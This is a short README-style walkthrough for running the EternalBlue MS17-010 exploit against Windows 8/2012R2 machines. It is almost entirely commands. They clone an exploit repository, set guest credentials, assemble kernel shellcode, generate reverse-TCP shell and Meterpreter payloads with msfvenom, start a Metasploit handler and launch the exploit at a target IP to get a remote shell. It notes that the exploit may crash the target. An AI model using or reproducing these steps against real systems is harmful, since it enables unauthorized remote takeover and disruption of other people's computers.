## Instructions to perform exploit

**Step 1:** `git clone https://github.com/w0rtw0rt/MS17-010.git && cd MS17-010/`

**Step 1a:** gedit/vi/nano eternalblue_exploit8.py and change lines 52 and 53 to match the account authentication

example:

`USERNAME='Guest'`

`PASSWORD=''`

**Step 2:** cd shellcode and type `nasm -f bin eternalblue_kshellcode_x64(x86).asm`

**Step 3:** `msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o meterpreter_(IP)_msf.bin EXITFUNC=thread LHOST=(IP) LPORT=(Port)`

**Step 3a:** `msfvenom -p windows/x64/shell/reverse_tcp -f raw -o shell_(IP)_msf.bin EXITFUNC=thread LHOST=(IP) LPORT=(Port)`

**Step 4:** `cat eternalblue_kshellcode_x64(x86) shell_(IP)_msf.bin (OR meterpreter_(IP)_msf.bin) > (payloadname).bin`

**Step 5:** Set up exploit/multi/handler in a new terminal window with matching payload you created above and run it

**Step 6:** `cd MS17-010`

**Step 7:** `python eternalblue_exploit8.py (target IP) (payloadname).bin (GROOM COUNT)`

**-side note-** Groom count will typically function with a "200" for windows 8/2012r2 but *might* crash the system - use at your own risk

**Step 8:** shell/meterpreter should be returned if "Guest" account is active or entered credentials worked.
